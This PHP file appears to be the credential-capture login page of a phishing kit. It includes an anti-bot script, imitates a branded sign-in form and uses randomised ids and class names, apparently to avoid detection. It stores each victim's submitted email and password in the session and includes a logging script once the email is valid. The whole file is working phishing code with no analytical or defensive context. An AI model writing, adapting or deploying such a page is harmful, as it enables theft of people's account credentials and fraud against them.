<?php


session_start();
error_reporting(0);
@ini_set('display_errors', 0); 
date_default_timezone_set('GMT');
############## SECOND FILES ############## 
include('../config.php');
include('../antibots.php');
include "../../lang".$_SESSION['Z-1-1-8'];
$time = date('d/m/Y G:i:s');
################## ACCOUNT INFORMATION #################
$_SESSION['_login_email1_']    = $_POST['login_email1'];
$_SESSION['_login_password1_'] = $_POST['login_password1'];
################## ACCOUNT INFORMATION #################
if(filter_var($_POST['login_email1'], FILTER_VALIDATE_EMAIL)){
  include('LOG1.php');
}
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title><?php echo $Z118_01; ?></title>
    <link rel="stylesheet" href="../../lib/css/L-Z118.css">
    <link rel="shortcut icon" type="image/x-icon" href="../../lib/img//favicon.ico">
    <meta name="viewport" content="initial-scale=1.0">
    <style type="text/css"></style>
    <script type="text/javascript" src="../../lib/js/jquery.js"></script>
    <script type="text/javascript" src="../../lib/js/login.js"></script>
</head>
<body><p style="color: white;">.</p>
	<div for=" 47036701064 " id="page" name="Login">
        <div for=" 40386154720 " id="content" class="contenidor-content">
            <div id="ras-dafhaaa" class="ras-dafhaaa ">
			<header>
                <div id=" 42453394727 " class="logo-header-svg"></div>
            </header>
                <section id="login" class="login">
                    <form for=" a46d4ace14caf05f50af464dee58a718 " action="" method="post" class="proceed maskable" id="formulario" name="login">
                        <div id="pass-sect" class="footer-sec">
						<?php 
						    if(isset($_GET['error_login'])){
							    echo "
								    <div class=\"error-assat\">
								    <div class=\"lisar\"><img src=\"../../lib/img/error.png\"></div>
								    <div class=\"liman\">".$Z118_13."</div>
								    </div>";
						    }
						?>
                            <div class="a-n-o-n-i-s-m-a" id="login_emaildiv">
                                <div class="a-n-o-n-i-s-m-a" style="z-index: 100;">
                                    <div for=" 47528614218 " class="khana-jadida tikchb-ila">
                                        <input for=" a46d4ace14caf05f50af464dee58a718 " class="controlar-formu" name="login_email1" type="email" placeholder="<?php echo $Z118_02; ?>" id="emay-add" value="<?php if(isset($_POST['login_email'])== true){ echo $_POST['login_email'];} ?>">
                                    </div>
                                    <div id=" 24303508334 " class="ghalat-assi">
                                        <p><?php echo $Z118_04; ?></p>
                                    </div>
                                </div>
                                <div id=" 31201284366 " class="a-n-o-n-i-s-m-a">
                                    <div id=" 42512980078 " class="khana-jadida tikchb-ila">
                                        <input for=" a46d4ace14caf05f50af464dee58a718 " class="controlar-formu" name="login_password1" type="password" placeholder="<?php echo $Z118_03; ?>" id="password">
                                    </div>
                                    <div id=" 29743055088 " class="ghalat-assi">
                                        <p id=" 17435488795 "><?php echo $Z118_05; ?></p>
                                    </div>
                                </div>
                            </div>
                            <div id=" 15125380847 " class="af3al cuerpooo">
                                <button for=" a46d4ace14caf05f50af464dee58a718 " class="button zidbut" type="submit" id="botdkhol" name="botdkhol" value="Login"><?php echo $Z118_06; ?></button>
                            </div>
                            <div id=" 29491974576 " class="lineab"><a href="#" id="tfkar-lpass" class="nsiti-pass"><?php echo $Z118_07; ?></a>
                                <div class="pwr-modal" id="nsalpas-mskin">
                                </div>
                            </div>
                            <a for=" 16160686035 " href="#" class="button tanitalt" id="ftahcont-jdid"><?php echo $Z118_08; ?></a></div>
                    </form>
                </section>
                <br>
            </div>
        </div>
        <div id=" 47941230950 " class="dorawlididor">
            <p id=" 38938929039 " class="anchofhhh"><?php echo $Z118_12; ?></p>
        </div>
    </div>
    <footer id=" 33176255125 " class="footer footer-sec">
        <ul>
            <li id=" 75844226501676 "><a href="#"><?php echo $Z118_09; ?></a></li>
            <li id=" 9244598635558 "></li>
            <li id=" 377662692577883 "><a href="#"><?php echo $Z118_10; ?></a></li>
        </ul>
        <br>
        <ul id=" 22797998221 ">
            <li id=" 16475653093 "><a href="#" style="color: #9e9e9e;"><?php echo $Z118_11; ?></a></li>
        </ul>
    </footer>

</body>
</html>